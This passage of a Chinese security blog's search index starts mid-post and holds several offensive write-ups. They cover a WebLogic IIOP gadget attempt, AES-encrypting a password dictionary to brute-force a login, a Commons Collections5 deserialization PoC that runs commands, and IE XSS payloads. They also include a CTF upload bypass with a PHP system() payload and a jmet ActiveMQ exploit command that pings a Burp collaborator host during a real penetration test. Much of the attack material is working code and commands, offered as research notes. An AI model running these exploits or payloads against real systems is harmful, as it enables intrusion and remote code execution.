山穷水尽疑无路至此一切都在向好的方向发展，首先我用没打补丁weblogic走了一波t3，一发入魂，稳稳的。打上最新补丁后走t3没成功，看报错想起了是去年oracle给t3加了一个ABBREV_CLASSES白名单。 但是没有关系，我们还可以用iiop重拳出击。长久以来我一直觉得t3和iiop是等价的东西，exp走t3成功，那走iiop也可成功，因此一直觉得官方单独给t3加白的操作不多余但没必要。 直到打完发现没成功，这下有点傻眼了。 看起来iiop和t3在反序列化的时候还是有不同。根据调用栈和调试可以定位到出错registerMessageType中的getMessageClassMap。 ) 看到这里你可能充满疑惑 反序列化不是可以控制任意成员变量（不严谨）吗？提前给__m_MessageClassMap设置好，不就可以规避空指针的问题？ 为什么t3的时候没有遇到这个问题？ 这里限于篇幅，我就直接说我调试的结论了。 关于第一个问题，确实可以控制，但是这里涉及反序列化时序的问题，就算设置了__m_MessageClassMap，逻辑走到这一步的时候成员变量还没有被赋值。 关于第二个问题，是因为走iiop时，反序列化Component时registerVaildation调用抛出异常了，进入了t3情况下不会进入的validateObject。 而出现异常的原因是也就是depth为0。 通常情况下depth会随着反序列化时的深度动态变化，因此我猜开发的本意是禁止Component成为最外层的对象。 但是IIOP因为自身实现的原因，进入了readObjectOverride，从始至终都没有进入readObject0。也就说整个过程depth一直为0。 至此情况变得很难受。t3白名单打不了，iiop因为这个gadget依赖了特殊的类也打不了。功败垂成，我当时觉得非常可惜。又折腾一会找不到替代类就放弃了。 柳岸花明又一村大约过了三周之后，我又想起了这个洞，突然eureka。既然正常流能打iiop不能打，那能不能把iiop“转换”成正常流然后再打呢？ 其实通过查看历史漏洞可以知道CVE-2016-3510就可以做到这一点。 至此，全链路已经打通。 为什么失败交给官方之后被驳回了，后来发现测试的时候少了一个补丁。 打补丁前： 打补丁后： 这里this.setFilter默认为true，也就说从2021的某一次补丁之后fromBinary这个点加了黑名单已经打不了。 后记虽然根据CVE-2016-3510，iiop和t3在漏洞利用上已经完全等价了。t3白不白已经不重要了，但t3白名单真的无法绕过吗？其实是可以的，但是这里空白太小写不下……","link":"/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Weblogic-IIOP-Gadget%E6%8C%96%E6%8E%98/"},{"title":"记一次简单的寻找前端加密爆破的逻辑过程","text":"过程比较简单，属于一篇水文。主要参考这篇文章中的第三种方法。 前端使用vue写的，把前端代码复制出来 找到登陆那点的触发函数 找到提交函数中密码变量 全局搜索即可定位到加密逻辑，并且找到加密用的密钥 通过注释可以发现是AES加密 查看代码变量可以看出是AES-ECB 1234567const encrypt=(word, keyStr)=&gt;{ keyStr = keyStr ? keyStr : 'abcdefgabcdefg12'; let key = CryptoJS.enc.Utf8.parse(keyStr);//Latin1 w8m31+Yy/Nw6thPsMpO5fg== let srcs = CryptoJS.enc.Utf8.parse(word); let encrypted = CryptoJS.AES.encrypt(srcs, key, {mode:CryptoJS.mode.ECB,padding: CryptoJS.pad.Pkcs7}); return encrypted.toString(); }; 从网上找个python版的AES-ECB脚本 12345678910111213141516171819202122232425262728293031from Crypto.Cipher import AESimport osfrom Crypto import Randomimport base64class AESUtil: __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size @staticmethod def encryt(str, key): cipher = AES.new(key, AES.MODE_ECB) x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16) if x != 0: str = str + chr(x)*x msg = cipher.encrypt(str) msg = base64.urlsafe_b64encode(msg).replace('=', '') return msg @staticmethod def decrypt(enStr, key): cipher = AES.new(key, AES.MODE_ECB) enStr += (len(enStr) % 4)*\"=\" decryptByts = base64.urlsafe_b64decode(enStr) msg = cipher.decrypt(decryptByts) paddingLen = ord(msg[len(msg)-1]) return msg[0:-paddingLen]if __name__ == \"__main__\": key = \"G20PAA&amp;9-EEFPQ5T\" print AESUtil.encryt(\"123456\", key) 将跑出来的脚本和提交的对比，发现提交的有padding。 稍微修改一下代码逻辑，从github上下弱口令字典生成加密字典 12345678910111213141516171819202122232425262728293031323334353637import requestsfrom Crypto.Cipher import AESimport osfrom Crypto import Randomimport base64class AESUtil: __BLOCK_SIZE_16 = BLOCK_SIZE_16 = AES.block_size @staticmethod def encryt(str, key): cipher = AES.new(key, AES.MODE_ECB) x = AESUtil.__BLOCK_SIZE_16 - (len(str) % AESUtil.__BLOCK_SIZE_16) if x != 0: str = str + chr(x)*x msg = cipher.encrypt(str) msg = base64.urlsafe_b64encode(msg) return msg @staticmethod def decrypt(enStr, key): cipher = AES.new(key, AES.MODE_ECB) enStr += (len(enStr) % 4)*\"=\" decryptByts = base64.urlsafe_b64decode(enStr) msg = cipher.decrypt(decryptByts) paddingLen = ord(msg[len(msg)-1]) return msg[0:-paddingLen]if __name__ == \"__main__\": resp = requests.get(url=\"https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/master/passwordDict/top1000.txt\") passwd_list = resp.content.split('\\n') key = \"G20PAA&amp;9-EEFPQ5T\" with open('./top1000en.txt', 'a+') as f: for i in passwd_list: f.write(AESUtil.encryt(i, key) + '\\n') print AESUtil.encryt(\"123456\", key)","link":"/2019/11/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BB%E6%89%BE%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%87%E7%A8%8B/"},{"title":"记一次调试Commons Collections5遇到的小坑","text":"故事的起因是学弟来问我为什么在调Commons Collections5的时候，还没有走到触发点就触发了RCE。并发来了这篇文章。我当时以commons collections5为例，调试了一下代码发现确实有这种情况。以下是调试用的demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import javax.management.BadAttributeValueExpException;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Poc { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"open /Applications/Calculator.app/\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); //decorate实例化LazyMap类。 // LazyMap類的get方法調用了transform,transform可以通過反射机制执行命令 TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //TiedMapEntry中调用了toString方法-&gt;调用了map的get方法 BadAttributeValueExpException poc = new BadAttributeValueExpException(null); //BadAttributeValueExpException的构造方法调用toString方法// val是私有变量，所以利用下面方法进行赋值,val变量赋值为TiedMapEntry的实例化对象,// 重写了BadAttributeValueExpException的readObject方法的val变量赋值为BadAttributeValueExpException类，// 就会调用BadAttributeValueExpException的val = valObj.toString();触发上面的 Field valfield = poc.getClass().getDeclaredField(\"val\");// System.out.println(valfield); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); }} 实际调试的时候我发现确实有学弟所说的情况，一图胜千言。 反复调了几次都是这个情况，感觉网上文章分析并没有问题因为走到toString那个点也会触发rce，调试时候的那个点也没道理弹框，感觉是idea有bug。后来去群里请教了一下师傅，evil7大师傅给了答案。师傅意思大致就是说在调试的时候调试器打印了valObj，所以相当于提前触发了valObj的toString方法。换句话说在调试情况下RCE触发了两次。","link":"/2019/11/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B0%83%E8%AF%95Commons%20Collections5%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E5%9D%91/"},{"title":"记录xss挑战赛14题解题过程","text":"解题过程只思考了这道题，然后就陷进去了。先来看题。 12345678910111213&lt;?phpheader('X-XSS-Protection:0');header('Content-Type:text/html;charset=utf-8');?&gt;&lt;head&gt;&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=''&gt;&lt;input type='hidden' name='token' value='&lt;?php echo htmlspecialchars($_GET['token']); ?&gt;'&gt;&lt;input type='submit'&gt;&lt;/body&gt; 考点是输出点出现在input hidden框里面，因为文本框被隐藏一般的和点击有关的事件（如 onfocus）就不会被触发了。 传统的解法大概有三种 第一种：IE6下用css的expression属性触发 第二种：firefox用accesskey=”X” onclick=alert(),然后shift+alt+x 触发 第三种：如果输入点在type=hidden前可以用另外一个type如type=text将type=hidden覆盖掉（这道题不行） 显然传统的办法肯定不会通过的（规则是：需要最新浏览器，不需要交互） 然后我就开始了漫漫的踩坑路。因为源码中有&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;所以我认为xss是在IE下触发.然后打开input=hidden的官方手册惊喜的发现input hidden下还有on*事件 然后百度了一下用法 onbeforedeactivateFires immediately before the activeElement is changed from the current object to another object in the parent document.在 activeElement 从当前对象变为父文档其它对象之前立即触发。不懂~ ondatasetcompleteFires to indicate that all data is available from the data source object.数据在数据源发生变化时触发的事件，不懂~ oninvalidProvides specified alert text if an input element is invalid. 123&lt;input type=\"text\" oninvalid=\"alert('该项不能空!');\" name=\"fname\" required&gt;&lt;input type=\"text\" name=\"phone\" maxlength=\"11\" pattern=\"^(0|86|17951)?1[0-9]{10}\" oninvalid=\"setCustomValidity('请输入11位手机号');\"/&gt; onselectonselect 事件会在文本框中的文本被选中时发生。Fires when the current selection changes.onpropertychange动态监听输入框值变化的情况，比如value属性的值改变时会触发 前两个不是很懂什么意思，试了后三个都不行 oninvalid：oninvalid一般情况下必须要配合required或者pattern,可惜的是hidden下均不支持 onselect：显然框都隐藏了，不可能还需要文本，况且需要交互。 onpropertychange：是一个死逻辑，想改变value值就许必须有个js触发点然后用DOM，不过既然都有触法点了谁还会用这个属性（这道题而言） 然后我就蒙蔽了，既然通常情况下都不行，那为什么还会写在input type=hidden下面，黑人问号？？？ 最后看到了柠檬师傅的正确答案 token=' style=behavior:url(x) onreadystatechange=alert(1) ' 后来查资料发现这是一个IE6~IE10支持的一个css的语法，behavior:url(???)允许调用一个外部的.htc文件来修改HTML的行为和方法（但是受同源策略影响）具体语法可以看 如果成功就有上传htc文件（可以写更复杂的利用代码而没有长度限制）配合xss这个思路。因为 .htc files are commonly used in .css files using an IE specific property called behavior, using this along with the .htc file allows the browser to run JavaScript code which is whats contained within the file. 下面是是一个利用demo 12345678910&lt;html&gt; &lt;head&gt; &lt;style&gt; h1 { behavior: url(behave.htc) } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;把鼠标放在这里 poluoluo.com&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 123456789101112131415&lt;component&gt;&lt;attach for=\"element\" event=\"onmouseover\" handler=\"hig_lite\" /&gt;&lt;attach for=\"element\" event=\"onmouseout\" handler=\"low_lite\" /&gt;&lt;script type=\"text/javascript\"&gt;alert(1);function hig_lite(){ element.style.color=255}function low_lite(){ element.style.color=0}&lt;/script&gt;&lt;/component&gt; 最后如有出错,还请指教 开学快乐！！","link":"/2017/09/01/%E8%AE%B0%E5%BD%95xss%E6%8C%91%E6%88%98%E8%B5%9B14%E9%A2%98%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/"},{"title":"记录一道题的多种解法","text":"通过备份文件泄露拿到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phperror_reporting(0);ini_set('open_basedir', '/var/www/html');function autoload($page) { if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) { die('no flag flag flag flag !'); } if (stripos($_SERVER['QUERY_STRING'], 'uploaded') &gt; 0) { die('no uploaded uploaded uploaded uploaded !'); } if (stripos($_SERVER['QUERY_STRING'], '://f') &gt; 0) { die('no ://f ://f ://f'); } if (stripos($_SERVER['QUERY_STRING'], 'ata') &gt; 0) { die('no ata ata ata'); } if (stripos($_SERVER['QUERY_STRING'], '0') &gt; 0) { die('no 0 0 0'); } if(file_exists(\"./includes/$page.php\")) { include \"./includes/$page.php\"; } elseif(file_exists(\"./includes/$page\")) { include \"./includes/$page\"; }else{ echo \"File is not exit \"; }}function download($adfile, $file){ //Only Administrators can download files . $cert = 'N'; if(isset($adfile) &amp;&amp; file_get_contents($adfile, 'r') === 'Yeah Everything Will Be Ok My Boss') { echo \"Welcome ! You Are Administrator !\"; $cert = 'Y'; }else{ echo \"error1\"; } if ($cert === 'Y'){ if (stripos($file, 'file_list') != false) die('error4'); if (stripos($file, 'file_list') &gt;= 0) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename='. basename($file)); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); }else{ die('error2'); }}else{ echo 'error3';}}if(!isset($_GET['page'])) { $page = 'index';}else { $page = $_GET['page'];}//不允许跳目录if (stripos($page, './') &gt; 0) { die('no ./ ./ ./ ./');}//不允许用协议if (stripos($page, '://') &gt; 0) { die('no :// :// ://');}autoload($page);if (isset($_GET[admin]) &amp;&amp; isset($_GET[file])) { if (stripos($_GET[admin], 'flag') &gt; 0 || stripos($_GET[file], 'flag') &gt; 0) { die('not flag flag flag falg !'); } if (strlen($_GET[file]) &gt;= 38) { die('too long'); } download($_GET[admin], $_GET[file]);}?&gt; 这个题还有一个上传点，要拿到upload.php。读文件的点在 这里可以用远程服务器写 echo -n “Yeah Everything Will Be Ok My Boss” &gt;&gt; index.html，然后访问读取 也可以php://input+Yeah Everything Will Be Ok My Boss 下面拿到download.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 &lt;?php if (stripos($_SERVER['QUERY_STRING'], 'flag') &gt; 0) { die('no flag flag flag flag !'); } if (!empty($_FILES)) { //properties of the uploaded file $name= $_FILES[\"filename\"][\"name\"]; $type= $_FILES[\"filename\"][\"type\"]; $size= $_FILES[\"filename\"][\"size\"]; $temp= $_FILES[\"filename\"][\"tmp_name\"]; $error= $_FILES[\"filename\"][\"error\"]; if (strlen($name) &gt;= 6) { die('name is too long !'); } if (stripos($name, './') &gt; 0) { die('invalid parameter'); } if (stripos($name, 'php') &gt; 0) { die('invalid parameter'); } //只能上传zip if (substr($name, -3, 3) !== 'zip' &amp;&amp; substr($name, -3, 3) !== 'jpg' &amp;&amp; substr($name, -3, 3) !== 'png') { die('file can not upload ! '); } if ($error &gt; 0) die(\"Error uploading file! code $error.\"); else { if($type !== \"application/zip\" || $size &gt; 400)//condition for the file { die(\"Format not allowed or file size too big!\"); } else { if(file_exists('includes')){ move_uploaded_file($temp, \"includes/uploaded/\" .$name); echo \"Upload complete a!\"; shell_exec('sh /var/www/html/includes/ '); }elseif(file_exists('uploaded')){ move_uploaded_file($temp, \"uploaded/\" .$name); echo \"Upload complete!\"; shell_exec('sh /var/www/html/includes/unzip.sh'); } } } }else{ if(isset($_GET['step']) &amp;&amp; strlen($_GET['step']) === 20) { if (stripos($_GET['step'], 'lag') &gt; 0) { die('error'); } if (stripos($_GET['step'], './') &gt; 0) { die('error'); } if (stripos($_GET['step'], ' ') &gt; 0) { die('error'); } if (stripos($_GET['step'], '/') &gt; 0) { die('error'); } if (preg_match('/[^\\w\\d_ -]/si', $_GET['step'])) { $_GET['step'] = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $_GET['step']); die('error'); } passthru('cat ' . 'uploaded/' . $_GET['step']); }else{ die(); } } ?&gt; &lt;/body&gt;&lt;/html&gt; 这段代码的大意是只能上传长度有限的代码，然后会进入 12345}elseif(file_exists('uploaded')){ move_uploaded_file($temp, \"uploaded/\" .$name); echo \"Upload complete!\"; shell_exec('sh /var/www/html/includes/unzip.sh');} 用同样的手法读出unzip.sh 可以看到它是先解压压缩包然后一点一点的删掉。 所以第一种方式就是利用时间差条件竞争，这也是我队师傅用的方法。这里省略。 然后第二天看别人wp的时候。发现一个比较巧妙的方法，就是观察到sh并没有删除所有的文件，保留了没有后缀名的文件（rm -rf ./uploaded/.*并不是删除当前文件所有内容的命令）。所以可以上传一个没有后缀名的php然后用index.php的包含代码包含进来。 在zip中压缩一个clound文件如下所示（这里需要注意因为是include进来，所以cat后面的路径是flag和index.php的路径） 123&lt;?php system('cat flag/flag/flag/flag/flag/flag/flag.php');?&gt; 然后访问http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/clound 这个payload的构造很有意思巧妙的绕过了。 注意到flag是flag{CVE_SomeThing_aBout_gitLab}也就就说上述两种方法都应该是非预期。 在网搜一下gitlab的历史漏洞注意到一个很有意思的漏洞通过软连接来读文件，隐隐感觉如果用这个姿势来做是一个很优雅的解法。 首先经过一次失败的实验发现软连接是相对的路径的。也就说建立软连接的时候要把flag的位置和软连接的位置摆好。假设/var/www/html为根目录 flag的位置/var/www/html/flag/flag/flag/flag/flag/flag/flag.php 上传的位置 /flag/flag/flag/flag/flag/flag/flag.php 在web目录下 12345mkdir -p flag/flag/flag/flag/flag/flag/mkdir -p includes/uploadedecho &quot;flag&quot; &gt;&gt; flag/flag/flag/flag/flag/flag/flag.phpcd includes/uploadedln -s ../../flag/flag/flag/flag/flag/flag/flag.php aaaaabbbbbcccccddddd 然后压缩软连接，上传如图 从图中我们也能清楚看到软连接是相对路径 最后访问http://47.104.188.226:20001/includes/uploaded/aaaaabbbbbcccccddddd 即可看到flag 也许你注意把软连接弄到20个字符，是因为在做的时候我犯了个错误，我以为把软连接传上去apache也会跟着软连接的指向去解析php，然后结合一下代码才能利用。 去读文件但其实不是这样的，直接访问软连接就可以看到内容。结合这几天的apache的一些知识，我想给出自己的答案。 apache解析php的原理首先一个常识是Apache自身并不能解析php。Apache是一个模块化程序，这这就意味着服务器只包括最基本的功能，其他的拓展的功能可以加载模块实现。Apache对于php的解析，就是通过众多Module中的php Module来完成的。 这个php模块会随着apache的启动被load进来。可以通过apachectl -M来查看 那么apache是怎么判断这个文件是不是应该交给php模块处理的呢？答案是通过MIME类型。 linux上有个/etc/mime.types它是mime-support包的一部分，这里面记录了所有的MIME类型。 当客户端请求一个文件时,如果后缀在这个列表里,那么apache就返回对应的content-type给浏览器，如果不在里面apache这个表里面则直接返回文件的内容（不返回content-type）。 当然这个你面有关php的是被注释掉了。不过在/etc/apache2/mods-enabled/php7.0.conf有中有这样一条等价配置。 它表示一旦匹配到php|php3|php4|php5|php7|pht|phtm这种东西则强制执行application/x-httpd-php这种类型所对应的处理器（php7_moudle）。 回头看刚才上传软连接没有后缀，所以apache不可能认识，于是他读出原本的内容（flag.php）然后直接返回并不带任何content-type，有图为证。 最后最后自己的思考并不保证正确，如果出错还请指正。 参考https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more https://paper.seebug.org/104/ http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/","link":"/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/"},{"title":"通过函数重定义绕过xss过滤器(IE)","text":"这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。 现在我们需要建立一个实验页面，让用户可控参数出现到JS函数的参数里面。 test.php 123456789&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /&gt;&lt;script&gt;function x() {}&lt;?php$x = isset($_GET['x']) ? $_GET['x'] : '';?&gt;x('&lt;?php echo $x?&gt;');&lt;/script&gt; 在老版本的IE浏览器里面，是有可能在一个函数的调用参数的地方重定义这个函数的。这将对绕过xss过滤器非常有用（如果你的payload能出现在这里） 通过GET传参somepage.php?x=1',x=alert,' 最后的结果像是这样 123456&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\" /&gt;&lt;script&gt;function x() {}x('1',x=alert,'');&lt;/script&gt; 这个payload将闭合两边的引号，同时function x重定义为alert因为alert只接受一个参数，所以其他的多余参数将被忽略。 不背翻译的锅http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/","link":"/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8(IE)/"},{"title":"重新编译jmet小记","text":"在一次渗透测试过程中，发现内网有一些activemq版本很老（2010年前的），但是并没有/fileserver这个路径意味着没法用CVE-2016-3088（猜测经过加固），不过幸运的是/admin没有授权就能访问意味着有主动触发CVE-2015-5254的可能性，猜测这种偏门的java洞可能被加固人员忽略，所以抄起jmet试了一下。回显如下 看样子是失败了，经过一番谷歌过后看到github上有如下回答，猜测是因为activemq所依赖的包版本过老而jmet依赖的包比较新所以打不成功。 正如github上这个老外所说需要加入legacy。 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt; &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt; &lt;version&gt;5.15.11&lt;/version&gt;&lt;/dependency&gt; 既然问题问题出在依赖上就意味着要重新编译，踩了一些坑下面记录一下。 jmet可以攻击多种软件，有一些是商业的软件我们搞不到对应的jar，所以删除下面两个java。 12rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.javarm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java 另外注意到jmet是依赖于ysoserial 并且我们后续也会用到，奈何没找到什么中央仓库提供这种黑客依赖。无奈需要自己到导入 1mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.5-SNAPSHOT -Dpackaging=jar -Dfile= 编译 12export MAVEN_OPTS=-Xss10mmvn clean compile assembly:single 然后就可以快乐的一键getshell了。 1proxychains java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net\" -Yp ROME ip port","link":"/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/"}],"tags":[{"name":"java","slug":"java","link":"/tags/java/"},{"name":"cobaltstrike","slug":"cobaltstrike","link":"/tags/cobaltstrike/"},{"name":"ssrf","slug":"ssrf","link":"/tags/ssrf/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"web cache","slug":"web-cache","link":"/tags/web-cache/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"杂","slug":"杂","link":"/tags/%E6%9D%82/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"kerberos","slug":"kerberos","link":"/tags/kerberos/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"xss","slug":"xss","link":"/tags/xss/"}],"categories":[{"name":"web security","slug":"web-security","link":"/categories/web-security/"},{"name":"redteam trick","slug":"redteam-trick","link":"/categories/redteam-trick/"},{"name":"binary","slug":"binary","link":"/categories/binary/"},{"name":"windows security","slug":"windows-security","link":"/categories/windows-security/"},{"name":"ad security","slug":"ad-security","link":"/categories/ad-security/"}]}